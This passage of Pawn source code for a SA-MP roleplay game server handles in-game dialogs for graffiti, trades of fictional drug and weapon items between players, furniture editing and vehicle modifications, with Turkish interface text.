				ShowPlayerDialog(playerid, 175, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Graffiti Sistemi", "Font Düzenle\nYazý Düzenle\nRenk Düzenle\nYazý Durumu\nFont Boyutu\nMateryal Boyutu\nÖnizleme\nGraffitiyi kaydet\nÖnizleme Ýptal\nÖnizleme Düzenle", "Seç", "Kapat");
				return 1;
			}

		    Karakter[playerid][gRenk] = HexToInteger(inputtext);
		    Bilgi(playerid,"Graffiti rengini deðiþtirdiniz.");
			ShowPlayerDialog(playerid, 175, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Graffiti Sistemi", "Font Düzenle\nYazý Düzenle\nRenk Düzenle\nYazý Durumu\nFont Boyutu\nMateryal Boyutu\nÖnizleme\nGraffitiyi kaydet\nÖnizleme Ýptal\nÖnizleme Düzenle", "Seç", "Kapat");
			ObjesiniGuncelle(playerid);
		}
	}
    if(dialogid == 179)
	{
	    if(response)
	    {
			new MesajString[256];
			Bilgi(playerid, "Graffiti yapmaya baþladýnýz.");
			DestroyDynamicObject(gObjesi[playerid]);
			format(MesajString,sizeof(MesajString),"%s",OyuncuAdiniBul(playerid));
			Karakter[playerid][gLabel] = CreateDynamic3DTextLabel(MesajString,0x7FFF00FF, Karakter[playerid][gPos][0],Karakter[playerid][gPos][1],Karakter[playerid][gPos][2]+1.5, 10, .worldid=Karakter[playerid][gVW]);
			Karakter[playerid][gYapiyor] = 1;
		}
	}
    if(dialogid == 180)
	{
		if(response)
		{
			FontBold[playerid] = listitem;
			ObjesiniGuncelle(playerid);
			Bilgi(playerid,"Yazý kalýnlýðýný deðiþtirdiniz.");
			ShowPlayerDialog(playerid, 175, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Graffiti Sistemi", "Font Düzenle\nYazý Düzenle\nRenk Düzenle\nYazý Durumu\nFont Boyutu\nMateryal Boyutu\nÖnizleme\nGraffitiyi kaydet\nÖnizleme Ýptal\nÖnizleme Düzenle", "Seç", "Kapat");
		}
	}
	if(dialogid == 181)
	{
	    if(response)
	    {
	        FontBoyutu[playerid] = strval(inputtext);
			ObjesiniGuncelle(playerid);
			Bilgi(playerid,"Font boyutunu deðiþtirdiniz.");
			ShowPlayerDialog(playerid, 175, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Graffiti Sistemi", "Font Düzenle\nYazý Düzenle\nRenk Düzenle\nYazý Durumu\nFont Boyutu\nMateryal Boyutu\nÖnizleme\nGraffitiyi kaydet\nÖnizleme Ýptal\nÖnizleme Düzenle", "Seç", "Kapat");
	    }
	}
	if(dialogid == 182)
	{
	    if(response)
	    {
	        switch(listitem)
			{
	            case 0: MateryalBoyutu[playerid] = 10;
	            case 1:  MateryalBoyutu[playerid] = 20;
	            case 2:  MateryalBoyutu[playerid] = 30;
	            case 3:  MateryalBoyutu[playerid] = 40;
	            case 4:  MateryalBoyutu[playerid] = 50;
	            case 5:  MateryalBoyutu[playerid] = 60;
	            case 6:  MateryalBoyutu[playerid] = 70;
	            case 7:  MateryalBoyutu[playerid] = 80;
	            case 8:  MateryalBoyutu[playerid] = 90;
	            case 9:  MateryalBoyutu[playerid] = 100;
	            case 10:  MateryalBoyutu[playerid] = 110;
	            case 11:  MateryalBoyutu[playerid] = 120;
	            case 12:  MateryalBoyutu[playerid] = 130;
	            case 13:  MateryalBoyutu[playerid] = 140;
	            default: MateryalBoyutu[playerid] = 70;
			}
			ObjesiniGuncelle(playerid);
			Bilgi(playerid,"Materyal boyutunu deðiþtirdiniz.");
			ShowPlayerDialog(playerid, 175, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Graffiti Sistemi", "Font Düzenle\nYazý Düzenle\nRenk Düzenle\nYazý Durumu\nFont Boyutu\nMateryal Boyutu\nÖnizleme\nGraffitiyi kaydet\nÖnizleme Ýptal\nÖnizleme Düzenle", "Seç", "Kapat");
	    }
	}
	if(dialogid == 183)
	{
	    if(response)
	    {
	        if(Karakter[playerid][gOnizleme] == 0)
	        {
       			if(!strcmp(Karakter[playerid][gYazi],"Yok", true))
       			{
       			    Hata(playerid,"Graffiti yazýsý ayarlanmamýþ.");
       			    return 1;
       			}
       			if(!strcmp(Karakter[playerid][gFont],"Yok", true))
       			{
       			    Hata(playerid,"Graffiti fontu ayarlanmamýþ.");
       			    return 1;
       			}
       			if(Karakter[playerid][gRenk] == 0)
       			{
       			    Hata(playerid,"Graffiti rengi ayarlanmamýþ.");
       			    return 1;
       			}
       			new Float:AdamPos[3];
		        GetPlayerPos(playerid, AdamPos[0],AdamPos[1],AdamPos[2]);
		        gObjesi[playerid] = CreateDynamicObject(19482,AdamPos[0]+2,AdamPos[1],AdamPos[2],0,0,0,GetPlayerVirtualWorld(playerid),GetPlayerInterior(playerid));
				ObjeKurdu(playerid);
				SetDynamicObjectMaterialText(gObjesi[playerid], 0,Karakter[playerid][gYazi],MateryalBoyutu[playerid],Karakter[playerid][gFont],FontBoyutu[playerid],FontBold[playerid],Karakter[playerid][gRenk],0,0);
				Streamer_Update(playerid);
				Karakter[playerid][gDuzenliyor] = 1;
				EditDynamicObject(playerid, gObjesi[playerid]);
				Karakter[playerid][gOnizleme] = 1;
				SetTimerEx("GraffitiSuresi",900000, false,"u",playerid);
		    }
		    else
		    {
		        Hata(playerid,"Þuan zaten önizleme yapýyorsunuz, iptal ya da düzenleme yapabilirsiniz.");
		    }
	    }
	}
	if(dialogid == 184)
	{
		if(response)
		{
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			if(Karakter[giveplayerid][amfetamin]-miktar >= 0)
			{
			    Karakter[giveplayerid][amfetamin] -= miktar;
			    Karakter[playerid][amfetamin] += miktar;
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
		}
		return 1;
	}
	if(dialogid == 185)
	{
		if(response)
		{
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			if(Karakter[giveplayerid][metamfetamin]-miktar >= 0)
			{
			    Karakter[giveplayerid][metamfetamin] -= miktar;
			    Karakter[playerid][metamfetamin] += miktar;
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
		}
		return 1;
	}
	if(dialogid == 186)
	{
		if(response)
		{
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			if(Karakter[giveplayerid][lsd]-miktar >= 0)
			{
			    Karakter[giveplayerid][lsd] -= miktar;
			    Karakter[playerid][lsd] += miktar;
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
		}
		return 1;
	}
	if(dialogid == 187)
	{
		if(response)
		{
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			if(Karakter[giveplayerid][extacy]-miktar >= 0)
			{
			    Karakter[giveplayerid][extacy] -= miktar;
			    Karakter[playerid][extacy] += miktar;
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
		}
		return 1;
	}
	if(dialogid == 188)
	{
		if(response)
		{
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			if(Karakter[giveplayerid][kokain]-miktar >= 0)
			{
			    Karakter[giveplayerid][kokain] -= miktar;
			    Karakter[playerid][kokain] += miktar;
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
		}
		return 1;
	}
	if(dialogid == 189)
	{
		if(response)
		{
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			if(Karakter[giveplayerid][eroin]-miktar >= 0)
			{
			    Karakter[giveplayerid][eroin] -= miktar;
			    Karakter[playerid][eroin] += miktar;
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
		}
		return 1;
	}
	if(dialogid == 190)
	{
		if(response)
		{
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			if(Karakter[giveplayerid][morfin]-miktar >= 0)
			{
			    Karakter[giveplayerid][morfin] -= miktar;
			    Karakter[playerid][morfin] += miktar;
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
		}
		return 1;
	}
	if(dialogid == 191)
	{
		if(response)
		{
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			if(Karakter[giveplayerid][MDA]-miktar >= 0)
			{
			    Karakter[giveplayerid][MDA] -= miktar;
			    Karakter[playerid][MDA] += miktar;
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
		}
		return 1;
	}
	if(dialogid == 192)
	{
	    if(response)
	    {
	        Karakter[playerid][meslek] = 4;
	        Bilgi(playerid, "Pizzacýlýk mesleðine katýldýnýz.");
		}
	}
	if(dialogid == 193)
	{
	    if(response)
	    {
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			new fiyat = UyusturucuTeklifFiyat[playerid];
			if(Karakter[playerid][para]-fiyat >= 0 && Karakter[giveplayerid][amfetamin]-miktar >= 0)
			{
			    Karakter[giveplayerid][amfetamin] -= miktar;
			    Karakter[playerid][amfetamin] += miktar;
			    GivePlayerCash(playerid, -fiyat);
			    GivePlayerCash(giveplayerid, fiyat);
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
	    }
		return 1;
	}
	if(dialogid == 194)
	{
	    if(response)
	    {
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			new fiyat = UyusturucuTeklifFiyat[playerid];
			if(Karakter[playerid][para]-fiyat >= 0 && Karakter[giveplayerid][metamfetamin]-miktar >= 0)
			{
			    Karakter[giveplayerid][metamfetamin] -= miktar;
			    Karakter[playerid][metamfetamin] += miktar;
			    GivePlayerCash(playerid, -fiyat);
			    GivePlayerCash(giveplayerid, fiyat);
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
	    }
		return 1;
	}
	if(dialogid == 195)
	{
	    if(response)
	    {
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			new fiyat = UyusturucuTeklifFiyat[playerid];
			if(Karakter[playerid][para]-fiyat >= 0 && Karakter[giveplayerid][lsd]-miktar >= 0)
			{
			    Karakter[giveplayerid][lsd] -= miktar;
			    Karakter[playerid][lsd] += miktar;
			    GivePlayerCash(playerid, -fiyat);
			    GivePlayerCash(giveplayerid, fiyat);
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
	    }
		return 1;
	}
	if(dialogid == 196)
	{
	    if(response)
	    {
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			new fiyat = UyusturucuTeklifFiyat[playerid];
			if(Karakter[playerid][para]-fiyat >= 0 && Karakter[giveplayerid][extacy]-miktar >= 0)
			{
			    Karakter[giveplayerid][extacy] -= miktar;
			    Karakter[playerid][extacy] += miktar;
			    GivePlayerCash(playerid, -fiyat);
			    GivePlayerCash(giveplayerid, fiyat);
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
	    }
		return 1;
	}
	if(dialogid == 197)
	{
	    if(response)
	    {
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			new fiyat = UyusturucuTeklifFiyat[playerid];
			if(Karakter[playerid][para]-fiyat >= 0 && Karakter[giveplayerid][kokain]-miktar >= 0)
			{
			    Karakter[giveplayerid][kokain] -= miktar;
			    Karakter[playerid][kokain] += miktar;
			    GivePlayerCash(playerid, -fiyat);
			    GivePlayerCash(giveplayerid, fiyat);
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
	    }
		return 1;
	}
	if(dialogid == 198)
	{
	    if(response)
	    {
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			new fiyat = UyusturucuTeklifFiyat[playerid];
			if(Karakter[playerid][para]-fiyat >= 0 && Karakter[giveplayerid][eroin]-miktar >= 0)
			{
			    Karakter[giveplayerid][eroin] -= miktar;
			    Karakter[playerid][eroin] += miktar;
			    GivePlayerCash(playerid, -fiyat);
			    GivePlayerCash(giveplayerid, fiyat);
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
	    }
		return 1;
	}
	if(dialogid == 199)
	{
	    if(response)
	    {
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			new fiyat = UyusturucuTeklifFiyat[playerid];
			if(Karakter[playerid][para]-fiyat >= 0 && Karakter[giveplayerid][morfin]-miktar >= 0)
			{
			    Karakter[giveplayerid][morfin] -= miktar;
			    Karakter[playerid][morfin] += miktar;
			    GivePlayerCash(playerid, -fiyat);
			    GivePlayerCash(giveplayerid, fiyat);
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
	    }
		return 1;
	}
	if(dialogid == 200)
	{
	    if(response)
	    {
		    new giveplayerid = UyusturucuTeklif[playerid];
			if(!IsPlayerConnected(giveplayerid)) return 1;
			new miktar = UyusturucuTeklifMiktar[playerid];
			new fiyat = UyusturucuTeklifFiyat[playerid];
			if(Karakter[playerid][para]-fiyat >= 0 && Karakter[giveplayerid][MDA]-miktar >= 0)
			{
			    Karakter[giveplayerid][MDA] -= miktar;
			    Karakter[playerid][MDA] += miktar;
			    GivePlayerCash(playerid, -fiyat);
			    GivePlayerCash(giveplayerid, fiyat);
			    new ver[128];
			    format(ver, sizeof(ver), "elindeki paketi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
				MeGonder(giveplayerid, 10.0, ver);
			}
	    }
		return 1;
	}
	if(dialogid == 201)
	{
		new silahveren = GetPVarInt(playerid, "SilahVeren");
		if(response)
		{
		    new alinansilah = GetPVarInt(playerid, "AlinanSilah");
		    if(HafifSilah(OyuncuSilah[SilahKullaniyor[silahveren]][silahid]) && HafifSilahVar(playerid)) return Hata(playerid, "Üzerinizde sadece 1 adet hafif silah bulundurabilirsiniz.");
			if(AgirSilah(OyuncuSilah[SilahKullaniyor[silahveren]][silahid]) && AgirSilahVar(playerid)) return Hata(playerid, "Üzerinizde sadece 1 adet aðýr silah bulundurabilirsiniz.");
			OyuncuSilah[SilahKullaniyor[silahveren]][oyuncuid] = Karakter[playerid][sqlid];
			OyuncuSilahKaydetEx(SilahKullaniyor[silahveren]);
		    RemovePlayerWeapon(silahveren, alinansilah);
		    if(IsPlayerAttachedObjectSlotUsed(playerid, gunindex[playerid])) { SetPVarInt(playerid, "SirtSilah", -1); RemovePlayerAttachedObject(playerid, gunindex[playerid]); gunindex[playerid] = -1; }
		    SilahKullaniyor[silahveren] = 0;
			new string[128];
            if(GetPlayerWeapon(silahveren) == alinansilah)
			{
			    format(string, sizeof(string), "%s, silah verirken silah hilesi yapýyor olabilir.", OyuncuAdiniBul(silahveren));
				AdminGonder(string);
			}
			new silahisim1[60];
		    switch(alinansilah)
		    {
		        case 0: silahisim1 = "Boþ";
		        case 1: silahisim1 = "Muþta";
		        case 2: silahisim1 = "Golf Sopasý";
		        case 3: silahisim1 = "Cop";
		        case 4: silahisim1 = "Býçak";
		        case 5: silahisim1 = "Beyzbol Sopasý";
		        case 6: silahisim1 = "Kürek";
		        case 7: silahisim1 = "Bilardo Sopasý";
		        case 8: silahisim1 = "Katana";
		        case 9: silahisim1 = "Testere";
		        case 10: silahisim1 = "Mor Dildo";
		        case 11: silahisim1 = "Küçük Beyaz Vibrator";
		        case 12: silahisim1 = "Büyük Beyaz Vibrator";
		        case 13: silahisim1 = "Gümüþ Vibrator";
		        case 14: silahisim1 = "Çiçek Demeti";
		        case 15: silahisim1 = "Baston";
		        case 16: silahisim1 = "El Bombasý";
		        case 17: silahisim1 = "Sis Bombasý";
		        case 18: silahisim1 = "Molotof";
		        case 22: silahisim1 = "Pistol";
		        case 23: silahisim1 = "Susturuculu Pistol";
		        case 24: silahisim1 = "Desert Eagle";
		        case 25: silahisim1 = "Shotgun";
		        case 26: silahisim1 = "Sawn-off Shotgun";
		        case 27: silahisim1 = "Combat Shotgun";
		        case 28: silahisim1 = "Micro SMG";
		        case 29: silahisim1 = "Mp5";
		        case 30: silahisim1 = "AK47";
		        case 31: silahisim1 = "M4";
		        case 32: silahisim1 = "Tec9";
		        case 33: silahisim1 = "Country Rifle";
		        case 34: silahisim1 = "Sniper Rifle";
		        case 35: silahisim1 = "Rocket Launcher";
		        case 36: silahisim1 = "HS Rocket Launcher";
		        case 37: silahisim1 = "Flamethrower";
		        case 38: silahisim1 = "Minigun";
		        case 39: silahisim1 = "Satchel Charge";
		        case 41: silahisim1 = "Spraycan";
		        case 42: silahisim1 = "Yangýn Söndürücü Tüp";
		        case 43: silahisim1 = "Kamera";
		        case 46: silahisim1 = "Paraþüt";
			}
		    format(string, sizeof(string), "%s'den %s aldýnýz.", OyuncuAdiniBul(silahveren), silahisim1);
		    Bilgi(playerid, string);
		    format(string, sizeof(string), "%s'e %s verdiniz.", OyuncuAdiniBul(playerid), silahisim1);
		    Bilgi(silahveren, string);

		    format(string, sizeof(string), "[SILAH LOG] %s'e %d silah verdi.", OyuncuAdiniBul(playerid), alinansilah);
		    Log(silahveren, string);
		    format(string, sizeof(string), "[SILAH LOG] %s'den %d silah aldý.", OyuncuAdiniBul(silahveren), alinansilah);
		    Log(playerid, string);
		}
		else
		{
			Hata(silahveren, "Silah teklifiniz reddedildi.");
		}
		return 1;
	}
	if(dialogid == 202)
	{
		new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        KarakterOzellik[giveplayerid][Guc] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	    return 1;
	}
	if(dialogid == 203)
	{
		new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][kaspuan] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	    return 1;
	}
	if(dialogid == 204)
	{
		if(response)
		{
		    switch(listitem)
		    {
		        case 0:ShowModelSelectionMenu(playerid, kitchen, "Mobilya -Mutfak-");
		        case 1:ShowModelSelectionMenu(playerid, tables, "Mobilya -Masalar-");
		        case 2:ShowModelSelectionMenu(playerid, walls, "Mobilya -Duvarlar-");
		        case 3:ShowModelSelectionMenu(playerid, doors2, "Mobilya -Kapilar-");
		        case 4:ShowModelSelectionMenu(playerid, chairs, "Mobilya -Sandalyeler-");
		        case 5:ShowModelSelectionMenu(playerid, bathroom, "Mobilya -Tuvalet-");
		        case 6:ShowModelSelectionMenu(playerid, beds, "Mobilya -Yataklar-");
		        case 7:ShowModelSelectionMenu(playerid, lights2, "Mobilya -Isiklar-");
		        case 8:ShowModelSelectionMenu(playerid, eletronic, "Mobilya -Elektronik Esyalar-");
		        case 9:ShowModelSelectionMenu(playerid, fitness, "Mobilya -Diger-");
		    }
		}
		return 1;
	}
	if(dialogid == 205)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
				new mstring[64],id=mobilyaci3[playerid];
  				format(mstring, sizeof(mstring), "MODELID\t{B3B3B3}%d\nTEXTURE\t{B3B3B3}%d - %d\nDüzenle\nKaldýr", Mobilya[id][mmodel], Mobilya[id][mtexture][0], Mobilya[id][mtexture][1]);
  				ShowPlayerDialog(playerid, 205, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Mobilya", mstring, "Seç", "Ýptal");
			}
			if(listitem == 1)
			{
			    //return Hata(playerid, "Ýnaktif.");
			    ShowPlayerDialog(playerid, 263, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Mobilya", "Index 1\nIndex 2", "Seç", "Ýptal");
			}
			if(listitem == 2)
			{
			    EditDynamicObject(playerid, mobilyaci[playerid]);
			    mobilyaci4[playerid] = 1;
			    Ipucu(playerid, "Mobilyanýzý düzenleyin.");
			}
			if(listitem == 3)
			{
				new id=mobilyaci3[playerid];
				DestroyDynamicObject(mobilyaci[playerid]);
				Mobilya[id][mx] = 0;
				Mobilya[id][my] = 0;
				Mobilya[id][mz] = 0;
			    Bilgi(playerid, "Mobilyanýz kaldýrýldý.");
			    MobilyaKaydet(id);
			}
	    }
	    return 1;
	}
	if(dialogid == 206)
	{
	    if(response)
		{
			if(listitem == 0) { ShowPlayerDialog(playerid, 206+1, DIALOG_STYLE_LIST, "Paintjob","Paintjob 1\nPaintjob 2\nPaintjob 3", "Seç", "Geri"); }
   			if(listitem == 1) { ShowPlayerDialog(playerid, 206+2, DIALOG_STYLE_LIST, "Rüzgarlýklar","Alien Rüzgarlýk\nX-Flow Rüzgarlýk", "Seç", "Geri"); }
			if(listitem == 2) { ShowPlayerDialog(playerid, 206+3, DIALOG_STYLE_LIST, "Çatýlýklar","Alien Çatýlýk\nX-Flow Çatýlýk\nCovertible Çatýlýk [Blade]\nVinyl Hardtop Çatýlýk [Blade]\nHardtop Çatýlýk [Savanna]\nSofttop Çatýlýk [Savanna]", "Seç", "Geri"); }
			if(listitem == 3) { ShowPlayerDialog(playerid, 206+4, DIALOG_STYLE_LIST, "Yan Tamponlar","Alien Yan Tampon\nX-Flow Yan Tampon\nChrome Yan Tampon [Broadway]\nChrome Flames Yan Tampon [Remington]\nChrome Arches Yan Tampon [Remington]\nChrome Strip Yan Tampon [Savanna & Blade & Tornado]\nChrome Trim Yan Tampon [Slamvan]\nWheelcovers Yan Tampon [Slamvan]", "Seç", "Geri"); }
			if(listitem == 4) { ShowPlayerDialog(playerid, 206+5, DIALOG_STYLE_LIST, "Egzozlar","Alien Egsoz\nX-Flow Egsoz\nSlamin Egsoz\nChrome Egsoz", "Seç", "Geri"); }
			if(listitem == 5) { ShowPlayerDialog(playerid, 206+6, DIALOG_STYLE_LIST, "Jantlar","Offroad\nShadow\nMega\nRimshine\nWires\nClassic\nTwist\nCutter\nSwitch\nGrove\nImport\nDollar\nTrance\nAtomic\nAhab\nVirtual\nAcces", "Seç", "Geri"); }
			if(listitem == 6) { ShowPlayerDialog(playerid, 206+7, DIALOG_STYLE_LIST, "Ön Tamponlar","Alien Ön Tampon\nX-Flow Ön Tampon\nChrome Ön Tampon\nSlamin Ön Tampon", "Seç", "Geri"); }
			if(listitem == 7) { ShowPlayerDialog(playerid, 206+8, DIALOG_STYLE_LIST, "Arka Tamponlar","Alien Arka Tampon\nX-Flow Arka Tampon\nChrome Arka Tampon\nSlamin Arka Tampon", "Seç", "Geri"); }
			if(listitem == 8) { ShowPlayerDialog(playerid, 206+9, DIALOG_STYLE_LIST, "Nitro","Nitro Sistemi", "Seç", "Geri"); }
			if(listitem == 9)
			{
			    ModifiyeYap(playerid, 1087, 800, 11, 120);
			}
			if(listitem == 10)
			{
			    for(new i; i < sizeof(ChangeColor); i++)
                {
                	TextDrawSetPreviewModel(ChangeColor[i], 19349);
                    TextDrawShowForPlayer(playerid,ChangeColor[i]);
                    renk1ayarliyo[playerid] = 1;
                }
                SelectTextDraw(playerid, 0xFFFFFF66) ;
			}
			if(listitem == 11)
			{
			    for(new i; i < sizeof(ChangeColor); i++)
                {
                	TextDrawSetPreviewModel(ChangeColor[i], 19349);
                    TextDrawShowForPlayer(playerid,ChangeColor[i]);
                    renk2ayarliyo[playerid] = 1;
                }
                SelectTextDraw(playerid, 0xFFFFFF66) ;
			}
			if(listitem == 12)
			{
			    new BigString[3098];
			    for(new i = 0; i < sizeof(ColorList); i++)
				{
					format(BigString, sizeof(BigString), "%s%s", BigString, ColorList[i]);
				}
				format(BigString, sizeof(BigString), "%s\n\n"C2"ÖRN: Renk1,Renk2",BigString);
			    ShowPlayerDialog(playerid, 310, DIALOG_STYLE_INPUT, "RenkID", BigString, "Renk Deðiþ", "Ýptal");
			}
			if(listitem == 13)
			{
   				SetTimerEx("Aractamiri", 3500, false, "i", kArac[playerid]);
	            SetPVarInt(playerid, "VehicleRepair", 1);
	            SetTimerEx("UnfreezeTimer", 3500, false, "u", playerid);
				SendClientMessage(playerid, TENRENGI, "» Aracýnýz tamir ediliyor, birkaç saniye bekleyin.");
				DONDUR(playerid);
			}
			if(listitem == 14)
			{
				new Float:X,Float:Y,Float:Z,Float:ANGLE,VW,INT, model2;
				GetVehiclePos(kArac[playerid],X,Y,Z);
				GetVehicleZAngle(kArac[playerid],ANGLE);
				model2 = GetVehicleModel(kArac[playerid]);
				VW = GetVehicleVirtualWorld(kArac[playerid]);
				INT = GetPlayerInterior(playerid);
				DestroyVehicle(kArac[playerid]);
				AddStaticVehicleEx(model2,X,Y,Z,ANGLE,0,0,0);
				LinkVehicleToInterior(kArac[playerid], INT);
				SetVehicleVirtualWorld(kArac[playerid],VW);
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModPaintjob] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModExhaust] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModWheels] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModFrontBumper] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRearBumper] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModStereo]  = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModHydraulics] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModNitro] = 0;
				BilgileriKaydet(kArac[playerid]);
				kArac[playerid] = 0;
			}
			//if(listitem == 10) { ShowPlayerDialog(playerid, 206+11, DIALOG_STYLE_INPUTTEXT, "Renk","Renk1'i girin.", "Seç", "Geri"); }
		}
		else
		{
		    kArac[playerid] = 0;
		}
		return 1;
	}
	if(dialogid == 206+1)
	{
		if(response)
		{
  			if(listitem == 0)
  			{
				if(GetVehicleModel(kArac[playerid]) == 483 || GetVehicleModel(kArac[playerid]) == 534 || GetVehicleModel(kArac[playerid]) == 535 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 558 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 560
				|| GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 575 || GetVehicleModel(kArac[playerid]) == 576)
				{
				    if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					AracModifiyeleri[Arac[kArac[playerid]][aid]][ModPaintjob] = 1;
					//ChangeVehicleColor(kArac[playerid], 1, 1);
					new model2, _int, _vw;
					new Float:aaX, Float:aaY, Float:aaZ, Float:aaA;
					model2 = GetVehicleModel(kArac[playerid]);
					GetVehiclePos(kArac[playerid],aaX,aaY,aaZ);
					GetVehicleZAngle(kArac[playerid], aaA);
					_int = GetVehicleInterior(kArac[playerid]);
					_vw = GetVehicleVirtualWorld(kArac[playerid]);
					DestroyVehicle(kArac[playerid]);
